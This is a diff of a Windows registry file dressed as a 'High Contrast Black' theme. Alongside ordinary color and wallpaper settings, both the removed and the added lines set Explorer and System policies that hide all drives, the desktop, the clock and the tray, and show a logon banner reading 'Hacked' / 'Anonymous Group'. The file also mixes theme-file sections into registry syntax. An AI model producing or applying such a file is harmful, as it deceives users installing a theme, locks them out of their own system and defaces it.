@@ -1,13 +1,5 @@
 Windows Registry Editor Version 5.00
 
-[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
-"NoDrives"=dword:03ffffff
-
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
-"HideClock"=dword:00000001
-"NoDesktop"=dword:00000001
-"NoTrayItemsDisplay"=dword:00000001
-
 [HKEY_CURRENT_USER\Control Panel\Colors]
 "ActiveBorder"="0 0 0"
 "ActiveTitle"="0 0 0"
@@ -41,19 +33,28 @@ Windows Registry Editor Version 5.00
 "WindowFrame"="0 0 0"
 "WindowText"="0 0 0"
 
-[Theme]
-DisplayName=High Contrast Black
-
 [HKEY_CURRENT_USER\Control Panel\Desktop]
 TileWallpaper=0
 WallpaperStyle=10
+
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"HideClock"=dword:00000001
+"NoDesktop"=dword:00000001
+"NoTrayItemsDisplay"=dword:00000001
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoDrives"=dword:03ffffff
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
+"legalnoticecaption"="Hacked"
+"legalnoticetext"="Anonymous Group"
+
+[Theme]
+DisplayName=High Contrast Black
 
 [VisualStyles]
 Path=%SystemRoot%\resources\themes\Aero\AeroLite.msstyles
 ColorStyle=NormalColor
 Size=NormalSize
 HighContrast=1
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
-"legalnoticecaption"="Hacked"
-"legalnoticetext"="Anonymous Group"
